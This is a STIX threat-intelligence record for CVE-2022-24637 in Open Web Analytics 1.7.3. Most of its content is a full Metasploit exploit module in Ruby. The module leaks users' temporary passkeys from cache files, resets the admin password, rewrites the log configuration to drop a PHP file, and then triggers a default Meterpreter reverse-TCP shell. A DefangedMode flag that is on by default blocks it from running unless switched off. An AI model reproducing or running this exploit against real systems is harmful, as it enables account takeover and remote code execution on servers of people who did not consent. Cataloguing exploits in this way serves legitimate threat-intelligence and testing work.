{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b0f09bdd-0f26-4117-934b-07f5245f5568",
    "created": "2024-08-14T17:07:52.714811Z",
    "modified": "2024-08-14T17:07:52.714815Z",
    "name": "Open Web Analytics 1.7.3 - Remote Code Execution (RCE)",
    "description": " Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated remote attacker to obtain sensitive user information, which can be used to gain admin privileges by leveraging cache hashes. This occurs because files generated with '<?php (instead of the intended \"<?php sequence) aren't handled by the PHP interpreter. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/open_web_analytics_rce.rb",
            "external_id": "open_web_analytics_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24637"
        },
        {
            "source_name": "reference",
            "url": "https://devel0pment.de/?p=2494"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Open Web Analytics 1.7.3 - Remote Code Execution (RCE)',\n        'Description' => %q{\n          Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated remote attacker to obtain sensitive\n          user information, which can be used to gain admin privileges by leveraging cache hashes.\n          This occurs because files generated with '<?php (instead of the intended \"<?php sequence) aren't handled\n          by the PHP interpreter.\n        },\n        'Author' => [\n          'Jacob Ebben',    # ExploitDB Exploit Author\n          'Dennis Pfleger'  # Msf Module\n        ],\n        'References' => [\n          [ 'CVE', '2022-24637'],\n          [ 'EDB', '51026'],\n          [ 'URL', 'https://devel0pment.de/?p=2494' ]\n        ],\n        'Licence' => MSF_LICENSE,\n        'Platform' => ['php'],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n        },\n        'Targets' => [ ['Automatic', {}] ],\n        'DisclosureDate' => '2022-03-18',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            ARTIFACTS_ON_DISK, # /owa-data/caches/{get_random_string(8)}.php\n            IOC_IN_LOGS, # Malicious GET/POST requests in the webservice logs\n            ACCOUNT_LOCKOUTS, # Account passwords will be changed in this module\n            CONFIG_CHANGES, # Will update config files to trigger the exploit\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('Username', [ true, 'Target username', 'admin' ]),\n      OptString.new('Password', [ true, 'Target new password', 'pwned' ]),\n    ])\n\n    register_advanced_options([\n      OptInt.new('SearchLimit', [ false, 'Upper limit of user ids to check for usable cache file', 100 ]),\n      OptBool.new('DefangedMode', [ true, 'Run in defanged mode', true ])\n    ])\n  end\n\n  def check\n    res = check_connection\n    return CheckCode::Unknown('Connection failed') unless res\n    return CheckCode::Safe if !res.body.include?('Open Web Analytics')\n\n    version = Rex::Version.new(res.body.scan(/version=([\\d.]+)/).flatten.first)\n    return CheckCode::Detected(\"Open Web Analytics #{version} detected\") unless version < Rex::Version.new('1.7.4')\n\n    CheckCode::Appears(\"Open Web Analytics #{version} is vulnerable\")\n  end\n\n  def exploit\n    if datastore['DefangedMode']\n      warning = <<~EOF\n\n\n        Are you SURE you want to execute the exploit against the target system?\n        Running this exploit will change user passwords and config files of the\n        target system.\n\n        Disable the DefangedMode option if you have authorization to proceed.\n      EOF\n\n      fail_with(Failure::BadConfig, warning)\n    end\n\n    username = datastore['Username']\n    new_password = datastore['Password']\n\n    res = check_connection\n    if res\n      print_good(\"Connected to #{full_uri} successfully!\")\n    end\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'owa_user_id' => username,\n        'owa_password' => rand_text_alphanumeric(8),\n        'owa_action' => 'base.login'\n      }\n    )\n    if res && res.code != 200\n      fail_with(Failure::UnexpectedReply, 'An error occurred during the login attempt!')\n    end\n\n    print_status(\"Attempting to find cache of '#{username}' user\")\n\n    found = false\n    cache = nil\n\n    limit = datastore['SearchLimit']\n    if limit < 0\n      fail_with(Failure::BadConfig, 'SearchLimit must be set to a number > 0!')\n    end\n\n    limit.times do |key|\n      user_id = \"user_id#{key}\"\n      userid_hash = Digest::MD5.hexdigest(user_id)\n      filename = \"#{userid_hash}.php\"\n      cache_request = send_request_cgi(\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, \"/owa-data/caches/#{key}/owa_user/#{filename}\")\n      )\n      if cache_request && cache_request.code == 404\n        next\n      end\n\n      cache_raw = cache_request.body\n      cache = get_cache_content(cache_raw)\n      cache_username = get_cache_username(cache)\n      if cache_username != username\n        print_status(\"The temporary password for a different user was found. \\\"#{cache_username}\\\": #{get_cache_temppass(cache)}\")\n        next\n      else\n        found = true\n        break\n      end\n    end\n\n    if !found\n      fail_with(Failure::NotFound, \"No cache found. Are you sure \\\"#{username}\\\" is a valid user?\")\n    end\n\n    cache_temppass = get_cache_temppass(cache)\n    print_good(\"Found temporary password for user '#{username}': #{cache_temppass}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.usersPasswordEntry'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'owa_password' => new_password,\n        'owa_password2' => new_password,\n        'owa_k' => cache_temppass,\n        'owa_action' => 'base.usersChangePassword'\n      }\n    )\n\n    if res && res.code != 302\n      fail_with(Failure::UnexpectedReply, 'An error occurred when changing the user password!')\n    end\n    print_good(\"Changed the password of '#{username}' to '#{new_password}'\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'owa_user_id' => username,\n        'owa_password' => new_password,\n        'owa_action' => 'base.login'\n      }\n    )\n\n    redirect = res['location']\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => URI(redirect).path\n    )\n    if res && res.code == 200\n      print_good(\"Logged in as #{username} user\")\n    else\n      fail_with(Failure::UnexpectedReply, \"An error occurred during the login attempt of user #{username}\")\n    end\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral')\n    )\n\n    shell_filename = \"#{rand_text_alphanumeric(8)}.php\"\n\n    nonce = get_update_nonce(res)\n    log_location = 'owa-data/caches/' + shell_filename\n    register_file_for_cleanup(shell_filename)\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'owa_nonce' => nonce,\n        'owa_action' => 'base.optionsUpdate',\n        'owa_config[base.error_log_file]' => log_location,\n        'owa_config[base.error_log_level]' => 2\n      }\n    )\n    fail_with(Failure::Unreachable, 'An error occurred when attempting to update config!') unless res && res.code == 302\n    print_status('Creating log file')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'owa_nonce' => nonce,\n        'owa_action' => 'base.optionsUpdate',\n        'owa_config[shell]' => payload.encoded + '?>'\n      }\n    )\n    fail_with(Failure::Unknown, 'An error occurred when attempting to update config!') unless res && res.code == 302\n    print_good('Wrote payload to file')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, \"/owa-data/caches/#{shell_filename}\"),\n      timeout: 1\n    )\n\n    print_good('Triggering payload! Check your listener!')\n  end\n\n  def check_connection\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm')\n    )\n  end\n\n  def get_cache_content(cache_raw)\n    regex_cache_base64 = /\\*(\\w*={0,2})/\n    regex_result = cache_raw.match(regex_cache_base64)\n\n    unless regex_result\n      fail_with(Failure::NotVulnerable, 'The serialized data can not be extracted from the cache file!')\n    end\n\n    Base64.decode64(regex_result[1]).force_encoding('ascii')\n  end\n\n  def get_cache_username(cache)\n    match = cache.match(/\"user_id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"(\\w*)\"/)\n\n    unless match\n      fail_with(Failure::NotVulnerable, 'The username can not be extracted from the cache file!')\n    end\n\n    match[1]\n  end\n\n  def get_cache_temppass(cache)\n    match = cache.match(/\"temp_passkey\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:32:\"(\\w*)\"/)\n\n    unless match\n      fail_with(Failure::NotVulnerable, 'The temp_passkey variable can not be extracted from the cache file!')\n    end\n\n    match[1]\n  end\n\n  def get_update_nonce(page)\n    update_nonce = page.body.match(/owa_nonce\" value=\"(\\w*)\"/)[1]\n\n    unless update_nonce\n      fail_with(Failure::NotVulnerable, 'The update_nonce variable can not be extracted from the page body!')\n    end\n\n    update_nonce\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-03-18",
    "x_mitre_platforms": [
        "['php']"
    ]
}